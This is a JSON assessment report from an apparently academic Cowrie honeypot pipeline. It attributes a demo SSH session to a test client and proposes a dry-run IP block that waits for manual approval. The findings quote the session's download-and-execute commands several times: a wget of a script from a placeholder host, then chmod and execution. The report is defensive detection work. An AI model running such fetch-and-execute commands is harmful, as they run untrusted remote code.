@@ -1,0 +1,954 @@
+{
+  "run_id": "20261112T072217Z-034f7b",
+  "mode": "assess",
+  "label": "DEMO ONLY - ephemeral in-memory key, not production trust",
+  "session_id": "42ee73a7cbbd",
+  "excluded_ids_untouched": false,
+  "ml_branch": {
+    "skipped": "assess mode: the ML branch already ran in 20261112T070531Z-670781 and is not repeated"
+  },
+  "rules_branch": {
+    "relay_record_verification": {
+      "relay_public_key_sha256": "a52b8c522a4bb0916536af2bf7d4f2f92f0cea47fe49553665e2a5b0a0d272bf",
+      "verify_ok": true,
+      "verify_reason": "chain and signatures verify",
+      "relay_lines_after": 13,
+      "new_records": [
+        {
+          "seq": 12,
+          "record_type": "connection_open",
+          "client_ip": "10.250.25.3",
+          "client_port": 47200,
+          "upstream_local_port": 50408,
+          "connection_id": "93daae7d-64df-4314-bcc9-f42f74789d27",
+          "accepted_utc": "2026-11-12T07:03:59.300090Z",
+          "closed_utc": null
+        },
+        {
+          "seq": 13,
+          "record_type": "connection_close",
+          "client_ip": "10.250.25.3",
+          "client_port": 47200,
+          "upstream_local_port": 50408,
+          "connection_id": "93daae7d-64df-4314-bcc9-f42f74789d27",
+          "accepted_utc": null,
+          "closed_utc": "2026-11-12T07:04:10.291870Z"
+        }
+      ]
+    },
+    "stopped": "after signed attribution and threat assessment (no response, no feedback)",
+    "assessment": {
+      "session_ref": "42ee73a7cbbd",
+      "tier": "propose",
+      "tier_reason": "all proposal conditions met; manual approval required",
+      "gates": {
+        "1_severity_S2_or_higher": true,
+        "2_interpretation_E2_or_higher_on_an_S2plus_finding": true,
+        "3_two_distinct_action_indicators": true,
+        "4_successful_login": true,
+        "5_attributable_source": true,
+        "6_not_protected_or_shared": true,
+        "7_verified_configuration_digests": true,
+        "8_no_processing_errors": true
+      },
+      "proposed_action": {
+        "execution": "not_executed",
+        "inverse": {
+          "subject": "10.250.25.3",
+          "type": "unblock_source_ip"
+        },
+        "manual_approval": "pending",
+        "mode": "dry_run",
+        "relay_connection_id": "93daae7d-64df-4314-bcc9-f42f74789d27",
+        "scope": "this sensor only",
+        "subject": "10.250.25.3",
+        "subject_basis": "attributable_via_proxy_mapping",
+        "ttl_seconds": 86400,
+        "type": "block_source_ip"
+      },
+      "successful_login_basis": "cowrie.login.success at 2026-11-12T07:04:00.059688Z correlated by session ID (signed result DEMO-20261112T072217Z-034f7b)",
+      "authentication_evidence": {
+        "event_observed": true,
+        "login_success_utc": "2026-11-12T07:04:00.059688Z",
+        "reason": "exactly one cowrie.login.success correlated by session ID, source, sensor and time",
+        "result_id": "DEMO-20261112T072217Z-034f7b",
+        "source": "signed attribution result",
+        "state": "login_success_observed"
+      },
+      "session_attribution": {
+        "ignored_untrusted_fields": [],
+        "mapping": {
+          "client": {
+            "ip": "10.250.25.3",
+            "port": 47200,
+            "role": "test_client"
+          },
+          "close_check": "consistent",
+          "connection_id": "93daae7d-64df-4314-bcc9-f42f74789d27",
+          "decision": "attributable_via_proxy_mapping",
+          "reason": "exactly one verified demo-listener relay record matches tuple, time and close",
+          "relay_listener": {
+            "accepted_local": "10.250.25.2:2222",
+            "ip": "10.250.25.2",
+            "mode": "demo",
+            "name": "demo",
+            "port": 2222
+          },
+          "relay_to_cowrie": {
+            "dst_ip": "172.22.0.1",
+            "dst_port": 2222,
+            "src_ip": "172.22.0.2",
+            "src_port": 50408
+          },
+          "result_hash": "dd1fc570a71cd8e918412e518e85669d4860b5e0c3e5159c9cae11b513a46fcd",
+          "result_id": "DEMO-20261112T072217Z-034f7b"
+        },
+        "reason": "verified signed attribution result maps this session to a registered demo client",
+        "source": "172.22.0.2",
+        "source_field": "src_ip",
+        "state": "attributable_via_proxy_mapping",
+        "subject": "10.250.25.3"
+      },
+      "findings": [
+        {
+          "attempted": true,
+          "attribution": {
+            "ignored_untrusted_fields": [],
+            "mapping": {
+              "client": {
+                "ip": "10.250.25.3",
+                "port": 47200,
+                "role": "test_client"
+              },
+              "close_check": "consistent",
+              "connection_id": "93daae7d-64df-4314-bcc9-f42f74789d27",
+              "decision": "attributable_via_proxy_mapping",
+              "reason": "exactly one verified demo-listener relay record matches tuple, time and close",
+              "relay_listener": {
+                "accepted_local": "10.250.25.2:2222",
+                "ip": "10.250.25.2",
+                "mode": "demo",
+                "name": "demo",
+                "port": 2222
+              },
+              "relay_to_cowrie": {
+                "dst_ip": "172.22.0.1",
+                "dst_port": 2222,
+                "src_ip": "172.22.0.2",
+                "src_port": 50408
+              },
+              "result_hash": "dd1fc570a71cd8e918412e518e85669d4860b5e0c3e5159c9cae11b513a46fcd",
+              "result_id": "DEMO-20261112T072217Z-034f7b"
+            },
+            "reason": "verified signed attribution result maps this session to a registered demo client",
+            "source": "172.22.0.2",
+            "source_field": "src_ip",
+            "state": "attributable_via_proxy_mapping",
+            "subject": "10.250.25.3"
+          },
+          "caveat_annotations": [],
+          "evidence_level": "E2",
+          "finding_id": "42ee73a7cbbd#0",
+          "interpretation": "download attempt",
+          "observed": [
+            {
+              "command": "chmod +x x.sh",
+              "detail": "uses downloaded file name",
+              "indicator": "EXEC-1",
+              "line": "chmod +x x.sh",
+              "line_index": 2,
+              "token": "chmod x.sh"
+            },
+            {
+              "command": "./x.sh",
+              "detail": "uses downloaded file name",
+              "indicator": "EXEC-1",
+              "line": "./x.sh",
+              "line_index": 3,
+              "token": "./x.sh"
+            },
+            {
+              "command": "wget http://files.example/x.sh -O x.sh",
+              "detail": "wget URL",
+              "indicator": "XFER-1",
+              "line": "wget http://files.example/x.sh -O x.sh",
+              "line_index": 1,
+              "token": "http://files.example/x.sh"
+            }
+          ],
+          "observed_line_indices": [
+            1,
+            2,
+            3
+          ],
+          "outcome": {
+            "EXEC-1": "not_observed",
+            "XFER-1": "not_observed"
+          },
+          "possible_intent": "consistent with an attempt to retrieve tooling or content (inferred; not established)",
+          "scope": "session",
+          "severity": "S2",
+          "severity_basis": "attempted retrieval of tooling; content and outcome unknown unless a file_download event exists",
+          "success_observed": false,
+          "supporting_action_indicators": [
+            "EXEC-1",
+            "XFER-1"
+          ]
+        },
+        {
+          "attempted": true,
+          "attribution": {
+            "ignored_untrusted_fields": [],
+            "mapping": {
+              "client": {
+                "ip": "10.250.25.3",
+                "port": 47200,
+                "role": "test_client"
+              },
+              "close_check": "consistent",
+              "connection_id": "93daae7d-64df-4314-bcc9-f42f74789d27",
+              "decision": "attributable_via_proxy_mapping",
+              "reason": "exactly one verified demo-listener relay record matches tuple, time and close",
+              "relay_listener": {
+                "accepted_local": "10.250.25.2:2222",
+                "ip": "10.250.25.2",
+                "mode": "demo",
+                "name": "demo",
+                "port": 2222
+              },
+              "relay_to_cowrie": {
+                "dst_ip": "172.22.0.1",
+                "dst_port": 2222,
+                "src_ip": "172.22.0.2",
+                "src_port": 50408
+              },
+              "result_hash": "dd1fc570a71cd8e918412e518e85669d4860b5e0c3e5159c9cae11b513a46fcd",
+              "result_id": "DEMO-20261112T072217Z-034f7b"
+            },
+            "reason": "verified signed attribution result maps this session to a registered demo client",
+            "source": "172.22.0.2",
+            "source_field": "src_ip",
+            "state": "attributable_via_proxy_mapping",
+            "subject": "10.250.25.3"
+          },
+          "caveat_annotations": [],
+          "evidence_level": "E2",
+          "finding_id": "42ee73a7cbbd#1",
+          "interpretation": "download-and-execute attempt",
+          "observed": [
+            {
+              "command": "chmod +x x.sh",
+              "detail": "uses downloaded file name",
+              "indicator": "EXEC-1",
+              "line": "chmod +x x.sh",
+              "line_index": 2,
+              "token": "chmod x.sh"
+            },
+            {
+              "command": "./x.sh",
+              "detail": "uses downloaded file name",
+              "indicator": "EXEC-1",
+              "line": "./x.sh",
+              "line_index": 3,
+              "token": "./x.sh"
+            },
+            {
+              "command": "wget http://files.example/x.sh -O x.sh",
+              "detail": "wget URL",
+              "indicator": "XFER-1",
+              "line": "wget http://files.example/x.sh -O x.sh",
+              "line_index": 1,
+              "token": "http://files.example/x.sh"
+            }
+          ],
+          "observed_line_indices": [
+            1,
+            2,
+            3
+          ],
+          "outcome": {
+            "EXEC-1": "not_observed",
+            "XFER-1": "not_observed"
+          },
+          "possible_intent": "consistent with an attempt to retrieve and run code (inferred; not established)",
+          "scope": "session",
+          "severity": "S3",
+          "severity_basis": "attempted execution of retrieved code",
+          "success_observed": false,
+          "supporting_action_indicators": [
+            "EXEC-1",
+            "XFER-1"
+          ]
+        }
+      ],
+      "caveat_annotations": [
+        "EMU-1"
+      ],
+      "distinct_action_indicators_on_qualifying_findings": [
+        "EXEC-1",
+        "XFER-1"
+      ],
+      "processing_errors": [],
+      "versions": {
+        "assessment": "threat-assessment-1.2.0",
+        "attribution_config_digest": "12524a531dcdbfb77f8006ed0160ca52734f967a395a4952a6e3cfe871559eb4",
+        "attribution_config_version": "3.0.0-DEMO",
+        "attribution_results": {
+          "accepted": [
+            {
+              "issued_utc": "2026-11-12T07:22:16.117022Z",
+              "result_hash": "dd1fc570a71cd8e918412e518e85669d4860b5e0c3e5159c9cae11b513a46fcd",
+              "result_id": "DEMO-20261112T072217Z-034f7b"
+            }
+          ],
+          "conflicts": [],
+          "rejected": []
+        },
+        "configuration_checks": {
+          "evidence_auth_rule_approved": true,
+          "evidence_internal_networks_equal_explicit_config": true,
+          "evidence_relays_cover_attribution_relays": true,
+          "policy_and_attribution_pin_same_address_safety": true,
+          "policy_pins_attribution_digest": true
+        },
+        "evidence_catalogue": "v2-evidence-1.1",
+        "evidence_config_digest_expected": "256b03e03115e6c9",
+        "evidence_config_digest_record": "256b03e03115e6c9",
+        "policy_digest": "5c06c39f41f0171d509d57e929b0fd1fc463825fe7a988f0e6123d855c69f947",
+        "policy_schema": "2.1",
+        "policy_version": "2.2.0-DEMO",
+        "telemetry_schema": "cowrie-json-2.9"
+      }
+    },
+    "behavioural_evidence": {
+      "abstention_reason": null,
+      "action_indicators": [
+        "EXEC-1",
+        "XFER-1"
+      ],
+      "authentication_status": "indeterminate:shared_source",
+      "behavioural_status": "interpreted",
+      "calibration": {
+        "digest": "227a3c9c09319ee3",
+        "sensor": "cowrie-project (lab, image bf371c37)",
+        "version": "train-20261110"
+      },
+      "catalogue_version": "v2-evidence-1.1",
+      "caveat_indicators": [
+        "EMU-1"
+      ],
+      "caveats": [],
+      "config_digest": "256b03e03115e6c9",
+      "context_indicators": [
+        "DISC-1",
+        "SHELL-1"
+      ],
+      "evidence_level": "E2",
+      "indicators": [
+        {
+          "category": "execution",
+          "caveats_on_same_lines": [],
+          "evidence_class": "directly_observed",
+          "id": "SHELL-1",
+          "kind": "context",
+          "limitations": "commands were issued; not what they did",
+          "matches": [
+            {
+              "command": "uname -a",
+              "detail": "",
+              "line": "uname -a",
+              "line_index": 0,
+              "token": "4 line(s)"
+            }
+          ],
+          "name": "interactive command activity",
+          "required_telemetry": [
+            "cowrie.command.input (input)"
+          ]
+        },
+        {
+          "category": "discovery",
+          "caveats_on_same_lines": [],
+          "evidence_class": "directly_observed",
+          "id": "DISC-1",
+          "kind": "context",
+          "limitations": "ordinary administration uses the same commands",
+          "matches": [
+            {
+              "command": "uname -a",
+              "detail": "",
+              "line": "uname -a",
+              "line_index": 0,
+              "token": "uname"
+            }
+          ],
+          "name": "system/identity discovery command",
+          "required_telemetry": [
+            "cowrie.command.input (input)"
+          ]
+        },
+        {
+          "category": "transfer",
+          "caveats_on_same_lines": [],
+          "evidence_class": "directly_observed",
+          "id": "XFER-1",
+          "kind": "action",
+          "limitations": "attempt only; success requires a cowrie.session.file_download event",
+          "matches": [
+            {
+              "command": "wget http://files.example/x.sh -O x.sh",
+              "detail": "wget URL",
+              "file": "x.sh",
+              "line": "wget http://files.example/x.sh -O x.sh",
+              "line_index": 1,
+              "token": "http://files.example/x.sh"
+            }
+          ],
+          "name": "download attempt",
+          "outcome": "not_observed",
+          "required_telemetry": [
+            "cowrie.command.input (input)",
+            "cowrie.session.file_download"
+          ]
+        },
+        {
+          "category": "execution",
+          "caveats_on_same_lines": [],
+          "evidence_class": "inferred",
+          "id": "EXEC-1",
+          "kind": "action",
+          "limitations": "links two typed commands; does not show the file existed or ran",
+          "matches": [
+            {
+              "command": "chmod +x x.sh",
+              "detail": "uses downloaded file name",
+              "file": "x.sh",
+              "line": "chmod +x x.sh",
+              "line_index": 2,
+              "token": "chmod x.sh"
+            },
+            {
+              "command": "./x.sh",
+              "detail": "uses downloaded file name",
+              "file": "x.sh",
+              "line": "./x.sh",
+              "line_index": 3,
+              "token": "./x.sh"
+            }
+          ],
+          "name": "execution of a file this session tried to download",
+          "outcome": "not_observed",
+          "required_telemetry": [
+            "cowrie.command.input (input)"
+          ]
+        },
+        {
+          "category": "emulator",
+          "caveats_on_same_lines": [],
+          "evidence_class": "emulator_dependent",
+          "id": "EMU-1",
+          "kind": "caveat",
+          "limitations": "a property of Cowrie, not of the client",
+          "matches": [
+            {
+              "command": "./x.sh ",
+              "detail": "cowrie.command.failed (emulator)",
+              "line": "",
+              "line_index": -1,
+              "token": "./x.sh"
+            }
+          ],
+          "name": "emulator could not run a command",
+          "required_telemetry": [
+            "cowrie.command.failed"
+          ]
+        }
+      ],
+      "interpretations": [
+        {
+          "evidence_level": "E2",
+          "name": "download attempt",
+          "outcome": {
+            "EXEC-1": "not_observed",
+            "XFER-1": "not_observed"
+          },
+          "requires": [
+            "XFER-1"
+          ],
+          "requires_one_of": [],
+          "scope": "session",
+          "supporting_action_indicators": [
+            "EXEC-1",
+            "XFER-1"
+          ]
+        },
+        {
+          "evidence_level": "E2",
+          "files": [
+            "x.sh"
+          ],
+          "name": "download-and-execute attempt",
+          "outcome": {
+            "EXEC-1": "not_observed",
+            "XFER-1": "not_observed"
+          },
+          "requires": [
+            "XFER-1",
+            "EXEC-1"
+          ],
+          "requires_one_of": [],
+          "scope": "session",
+          "supporting_action_indicators": [
+            "EXEC-1",
+            "XFER-1"
+          ]
+        }
+      ],
+      "n_input_lines": 4,
+      "session_ref": "42ee73a7cbbd",
+      "src_ip": "172.22.0.2",
+      "statistical_novelty": null,
+      "telemetry_schema": "cowrie-json-2.9",
+      "timing_context": {
+        "inter_input_gaps": 3,
+        "inter_input_max_s": 1.649256,
+        "inter_input_mean_s": 1.483745,
+        "session_duration_s": 10.5
+      }
+    },
+    "attribution": {
+      "state": "attributable_via_proxy_mapping",
+      "client_ip": "10.250.25.3",
+      "client_port": 47200,
+      "close_check": "consistent"
+    },
+    "signed_result": {
+      "result_id": "DEMO-20261112T072217Z-034f7b",
+      "issued_utc": "2026-11-12T07:22:16.117022Z",
+      "not_after_utc": "2026-11-12T08:22:16.117022Z",
+      "signer": {
+        "key_id": "4dc886739996a75f",
+        "public_key_sha256": "4dc886739996a75f26e3572c4c91ab82d1a148b48596ada5008d4cc03afb95a7"
+      },
+      "result_hash": "dd1fc570a71cd8e918412e518e85669d4860b5e0c3e5159c9cae11b513a46fcd"
+    },
+    "evidence_match": {
+      "session ID": {
+        "signed": "42ee73a7cbbd",
+        "evidence": "42ee73a7cbbd",
+        "match": true
+      },
+      "client address (signed vs relay open record)": {
+        "signed": [
+          "10.250.25.3",
+          47200
+        ],
+        "evidence": [
+          "10.250.25.3",
+          47200
+        ],
+        "match": true
+      },
+      "client is the test client": {
+        "signed": "10.250.25.3",
+        "evidence": "10.250.25.3",
+        "match": true
+      },
+      "source attribution decision": {
+        "signed": "attributable_via_proxy_mapping",
+        "evidence": "attributable_via_proxy_mapping",
+        "match": true
+      },
+      "relay->Cowrie tuple (signed vs Cowrie connect)": {
+        "signed": [
+          "172.22.0.2",
+          50408
+        ],
+        "evidence": [
+          "172.22.0.2",
+          50408
+        ],
+        "match": true
+      },
+      "relay->Cowrie tuple (signed vs relay upstream)": {
+        "signed": [
+          "172.22.0.2",
+          50408
+        ],
+        "evidence": [
+          "172.22.0.2",
+          50408
+        ],
+        "match": true
+      },
+      "connection ID (signed, open, close)": {
+        "signed": [
+          "93daae7d-64df-4314-bcc9-f42f74789d27",
+          "93daae7d-64df-4314-bcc9-f42f74789d27"
+        ],
+        "evidence": [
+          "93daae7d-64df-4314-bcc9-f42f74789d27",
+          "93daae7d-64df-4314-bcc9-f42f74789d27"
+        ],
+        "match": true
+      },
+      "relay record hashes (open, close)": {
+        "signed": [
+          "c96d4c9554b02f4dc4e1ee562f645350e5a2f9d5c6417ba21fe19e525e8a013d",
+          "0cab24eaac0798cb5dcbd8d1f5393ee312b247c1de7903371e069f9be768c9f5"
+        ],
+        "evidence": [
+          "c96d4c9554b02f4dc4e1ee562f645350e5a2f9d5c6417ba21fe19e525e8a013d",
+          "0cab24eaac0798cb5dcbd8d1f5393ee312b247c1de7903371e069f9be768c9f5"
+        ],
+        "match": true
+      },
+      "relay accepted time": {
+        "signed": "2026-11-12T07:03:59.300090Z",
+        "evidence": "2026-11-12T07:03:59.300090Z",
+        "match": true
+      },
+      "relay upstream connected time": {
+        "signed": "2026-11-12T07:03:59.472172Z",
+        "evidence": "2026-11-12T07:03:59.472172Z",
+        "match": true
+      },
+      "relay closed time": {
+        "signed": "2026-11-12T07:04:10.291870Z",
+        "evidence": "2026-11-12T07:04:10.291870Z",
+        "match": true
+      },
+      "Cowrie connect time": {
+        "signed": "2026-11-12T07:03:59.679666Z",
+        "evidence": "2026-11-12T07:03:59.679666Z",
+        "match": true
+      },
+      "Cowrie closed time": {
+        "signed": "2026-11-12T07:04:10.280464Z",
+        "evidence": "2026-11-12T07:04:10.280464Z",
+        "match": true
+      },
+      "login success time (signed vs cowrie.login.success)": {
+        "signed": "2026-11-12T07:04:00.059688Z",
+        "evidence": "2026-11-12T07:04:00.059688Z",
+        "match": true
+      },
+      "login state": {
+        "signed": "login_success_observed",
+        "evidence": "login_success_observed",
+        "match": true
+      },
+      "close check": {
+        "signed": "consistent",
+        "evidence": "consistent",
+        "match": true
+      }
+    },
+    "container_summary": {
+      "isolation": {
+        "in_container": true,
+        "uid": 999,
+        "forbidden_paths_reachable": [],
+        "private_key_files_readable": [],
+        "network_interfaces": [
+          "lo"
+        ],
+        "scan_roots": [
+          "/opt/project",
+          "/work/input"
+        ],
+        "ok": true
+      },
+      "attribution_config": "12524a531dcdbfb77f8006ed0160ca52734f967a395a4952a6e3cfe871559eb4",
+      "attribution_schema": "threat-attribution-config-3",
+      "policy": "2.2.0-DEMO",
+      "policy_schema": "2.1",
+      "result_key_status": "provisioned",
+      "audit_chain": {
+        "ok": true,
+        "index": null,
+        "reason": "chain intact",
+        "entries": 1,
+        "last_hash": "c72154e07fae9d053c816c55d6233f8eb2a0609429d90f6b2707ca49c678fc42"
+      },
+      "sessions": {
+        "42ee73a7cbbd": {
+          "tier": "propose",
+          "attribution": "attributable_via_proxy_mapping",
+          "failed_gates": [],
+          "login_basis": "cowrie.login.success at 2026-11-12T07:04:00.059688Z correlated by session ID (signed result DEMO-20261112T072217Z-034f7b)",
+          "subject": "10.250.25.3"
+        }
+      },
+      "attribution_results": {
+        "accepted": [
+          {
+            "result_id": "DEMO-20261112T072217Z-034f7b",
+            "result_hash": "dd1fc570a71cd8e918412e518e85669d4860b5e0c3e5159c9cae11b513a46fcd",
+            "issued_utc": "2026-11-12T07:22:16.117022Z"
+          }
+        ],
+        "rejected": [],
+        "conflicts": []
+      }
+    },
+    "container_opened_files": {
+      "startup": 105,
+      "isolation_scan": 64,
+      "assessment": 12
+    },
+    "container_demo_inputs_loaded": [
+      "/work/input/attribution_result_DEMO-20261112T072217Z-034f7b.pub.pem",
+      "/work/input/calibration_DEMO-20261112T072217Z-034f7b.json",
+      "/work/input/cowrie_events_DEMO-20261112T072217Z-034f7b.jsonl",
+      "/work/input/defence_policy_v2_2_DEMO-20261112T072217Z-034f7b.json",
+      "/work/input/signed_result_DEMO-20261112T072217Z-034f7b.json",
+      "/work/input/threat_attribution_v3_DEMO-20261112T072217Z-034f7b.json"
+    ],
+    "keys": {
+      "result": {
+        "role": "attribution_result (DEMO)",
+        "sha256": "4dc886739996a75f26e3572c4c91ab82d1a148b48596ada5008d4cc03afb95a7",
+        "label": "DEMO ONLY - ephemeral in-memory key, not production trust"
+      }
+    }
+  },
+  "hashes_before": {
+    "parse_logs.py": "4987a671271450016ede8172230abd1ec49ded22a2190a71b471f577dbbaa414",
+    "extract_features.py": "6524aedf68d8aca4aacc30ab2531acdb52614ba63c9c374061fe1bd7203b653e"
+  },
+  "hashes_after": {
+    "parse_logs.py": "4987a671271450016ede8172230abd1ec49ded22a2190a71b471f577dbbaa414",
+    "extract_features.py": "6524aedf68d8aca4aacc30ab2531acdb52614ba63c9c374061fe1bd7203b653e"
+  },
+  "subprocess_commands": [
+    [
+      "docker",
+      "compose",
+      "-f",
+      "C:\\AMRITA\\Final_Year_Project_zero_day_27\\adaptive-zero-day-honeypot\\cowrie\\docker-compose.yml",
+      "--profile",
+      "assessment",
+      "run",
+      "--rm",
+      "-T",
+      "--entrypoint",
+      "/cowrie/cowrie-env/bin/python3",
+      "threat-assessment",
+      "/work/input/demo_container_wrapper-20261112T072217Z-034f7b.py",
+      "--repo-root",
+      "/opt/project",
+      "--attribution-config",
+      "/work/input/threat_attribution_v3_DEMO-20261112T072217Z-034f7b.json",
+      "--policy",
+      "/work/input/defence_policy_v2_2_DEMO-20261112T072217Z-034f7b.json",
+      "--result-public-key",
+      "/work/input/attribution_result_DEMO-20261112T072217Z-034f7b.pub.pem",
+      "--calibration",
+      "/work/input/calibration_DEMO-20261112T072217Z-034f7b.json",
+      "--cowrie-events",
+      "/work/input/cowrie_events_DEMO-20261112T072217Z-034f7b.jsonl",
+      "--signed-result",
+      "/work/input/signed_result_DEMO-20261112T072217Z-034f7b.json",
+      "--now",
+      "2026-11-12T07:22:17.117022Z",
+      "--out-dir",
+      "/work/output/demo-20261112T072217Z-034f7b/assessment"
+    ]
+  ],
+  "files_created": [
+    "cowrie\\assessment_work\\input\\cowrie_events_DEMO-20261112T072217Z-034f7b.jsonl",
+    "cowrie\\assessment_work\\input\\address_safety_DEMO-20261112T072217Z-034f7b.json",
+    "cowrie\\assessment_work\\input\\threat_attribution_v3_DEMO-20261112T072217Z-034f7b.json",
+    "cowrie\\assessment_work\\input\\defence_policy_v2_2_DEMO-20261112T072217Z-034f7b.json",
+    "cowrie\\assessment_work\\input\\attribution_result_DEMO-20261112T072217Z-034f7b.pub.pem",
+    "cowrie\\assessment_work\\input\\calibration_DEMO-20261112T072217Z-034f7b.json",
+    "cowrie\\assessment_work\\input\\demo_container_wrapper-20261112T072217Z-034f7b.py",
+    "cowrie\\assessment_work\\input\\signed_result_DEMO-20261112T072217Z-034f7b.json"
+  ],
+  "argv": [
+    "assess",
+    "--approved",
+    "--evidence-run",
+    "20261112T070531Z-670781",
+    "--demo-session-exception",
+    "42ee73a7cbbd"
+  ],
+  "started_utc": "2026-11-12T07:22:17.117022Z",
+  "cowrie_slice": {
+    "evidence_run": "20261112T070531Z-670781",
+    "slice_sha256": "50c0f94232e9d7b1f5fc933e57bdd9ef6df1bcd35cf29f7405528788aa995650",
+    "slice_events": 14,
+    "sessions": [
+      "42ee73a7cbbd"
+    ],
+    "relay_baseline": 11,
+    "relay_lines_now": 13
+  },
+  "demo_session_exception": {
+    "session_id": "42ee73a7cbbd",
+    "scope": "demonstration only: behavioural evidence, demo-signed attribution, threat assessment (dry-run response/feedback only after separate approval)",
+    "authorised": "Task 29D, 2026-11-12",
+    "global_exclusions_unchanged": {
+      "version": "2.0.0",
+      "digest": "2a50f53f4a730641487921b3c4b8698ecb9964a55d8c995633fbb12f26868ca5",
+      "still_excluded": true
+    },
+    "exclusions_file_sha256": "92015d64d52354b9ad8b5c3233bc6189c0724a5a711fba36bf42d06e56362856",
+    "not_applicable_to": [
+      "dataset construction",
+      "model training",
+      "validation",
+      "evaluation",
+      "benchmark experiments"
+    ]
+  },
+  "removed": [
+    "cowrie\\assessment_work\\input\\cowrie_events_DEMO-20261112T072217Z-034f7b.jsonl",
+    "cowrie\\assessment_work\\input\\address_safety_DEMO-20261112T072217Z-034f7b.json",
+    "cowrie\\assessment_work\\input\\threat_attribution_v3_DEMO-20261112T072217Z-034f7b.json",
+    "cowrie\\assessment_work\\input\\defence_policy_v2_2_DEMO-20261112T072217Z-034f7b.json",
+    "cowrie\\assessment_work\\input\\attribution_result_DEMO-20261112T072217Z-034f7b.pub.pem",
+    "cowrie\\assessment_work\\input\\calibration_DEMO-20261112T072217Z-034f7b.json",
+    "cowrie\\assessment_work\\input\\demo_container_wrapper-20261112T072217Z-034f7b.py",
+    "cowrie\\assessment_work\\input\\signed_result_DEMO-20261112T072217Z-034f7b.json",
+    "cowrie\\assessment_work\\output\\demo-20261112T072217Z-034f7b/ (this run's output directory)"
+  ],
+  "checks": [
+    {
+      "check": "captured slice matches the evidence manifest hash",
+      "pass": true,
+      "detail": "50c0f94232e9d7b1f5fc933e57bdd9ef6df1bcd35cf29f7405528788aa995650"
+    },
+    {
+      "check": "captured slice holds exactly the recorded session",
+      "pass": true,
+      "detail": "['42ee73a7cbbd'], 14 events"
+    },
+    {
+      "check": "demonstration exception: exact ID, explicitly requested, registered demo session, global exclusion untouched",
+      "pass": true,
+      "detail": "{\"session_id\": \"42ee73a7cbbd\", \"scope\": \"demonstration only: behavioural evidence, demo-signed attribution, threat assessment (dry-run response/feedback only after separate approval)\", \"authorised\": \""
+    },
+    {
+      "check": "exception refuses every other excluded session and any other requested ID",
+      "pass": true,
+      "detail": "22 refusals over the other 7 excluded IDs"
+    },
+    {
+      "check": "relay records verify with the real relay PUBLIC key (chain + signatures)",
+      "pass": true,
+      "detail": "chain and signatures verify"
+    },
+    {
+      "check": "new relay connections are from the test client only (10.250.25.3; control client unused)",
+      "pass": true,
+      "detail": "2 new records: connection_open:10.250.25.3, connection_close:10.250.25.3"
+    },
+    {
+      "check": "fresh session's Cowrie source port matches the test client's relay connection",
+      "pass": true,
+      "detail": "src_port 50408 -> 10.250.25.3"
+    },
+    {
+      "check": "DEMO keys are distinct from each other and from the relay key",
+      "pass": true,
+      "detail": ""
+    },
+    {
+      "check": "signed attribution: relay chain verifies",
+      "pass": true,
+      "detail": "chain and signatures verify"
+    },
+    {
+      "check": "signed attribution: session mapped to the test client",
+      "pass": true,
+      "detail": "attributable_via_proxy_mapping -> 10.250.25.3"
+    },
+    {
+      "check": "DEMO-signed attribution result verifies in process with the DEMO public key",
+      "pass": true,
+      "detail": "signature and result hash verify with the DEMO result public key"
+    },
+    {
+      "check": "result signer is the DEMO result key (not the relay key)",
+      "pass": true,
+      "detail": "4dc886739996a75f"
+    },
+    {
+      "check": "signed attribution matches the captured evidence (session, client, tuple, records, timestamps, login)",
+      "pass": true,
+      "detail": "16/16 fields match"
+    },
+    {
+      "check": "stage 9 threat scoring ran in the isolated container",
+      "pass": true,
+      "detail": "ok"
+    },
+    {
+      "check": "container isolation self-check ok",
+      "pass": true,
+      "detail": ""
+    },
+    {
+      "check": "container loaded no production config (assessment phase)",
+      "pass": true,
+      "detail": "loaded 6 DEMO inputs from /work/input; production: []"
+    },
+    {
+      "check": "isolation self-check scanned the repository (read-only key scan, not config loading)",
+      "pass": true,
+      "detail": "64 files scanned"
+    },
+    {
+      "check": "stage 9 tier recorded as produced by the unchanged assessor: propose",
+      "pass": true,
+      "detail": "all proposal conditions met; manual approval required"
+    },
+    {
+      "check": "stage 9 proposal is dry-run, approval pending, not executed",
+      "pass": true,
+      "detail": ""
+    },
+    {
+      "check": "container verified the DEMO-signed result (accepted, none rejected)",
+      "pass": true,
+      "detail": "[{'issued_utc': '2026-11-12T07:22:16.117022Z', 'result_hash': 'dd1fc570a71cd8e918412e518e85669d4860b5e0c3e5159c9cae11b513a46fcd', 'result_id': 'DEMO-20261112T07"
+    },
+    {
+      "check": "altered signed attribution is rejected",
+      "pass": true,
+      "detail": "[{'result_id': 'DEMO-20261112T072217Z-034f7b', 'reason': 'result_hash mismatch (result modified)'}]"
+    },
+    {
+      "check": "unsigned attribution is rejected (no proposal)",
+      "pass": true,
+      "detail": "[{'result_id': None, 'reason': 'unsigned attribution result'}]"
+    },
+    {
+      "check": "no command touched the live Cowrie container in this mode",
+      "pass": true,
+      "detail": ""
+    },
+    {
+      "check": "global exclusions still active after the run (session excluded for datasets/training/evaluation)",
+      "pass": true,
+      "detail": "2.0.0 2a50f53f4a730641"
+    },
+    {
+      "check": "this process opened no production config, private key, Cowrie log, Dataset V2 or sealed data",
+      "pass": true,
+      "detail": "[]"
+    },
+    {
+      "check": "parse_logs.py / extract_features.py unchanged",
+      "pass": true,
+      "detail": ""
+    },
+    {
+      "check": "cleanup removed only this run's artifacts; scratch folders restored",
+      "pass": true,
+      "detail": "9 paths removed"
+    }
+  ]
+}
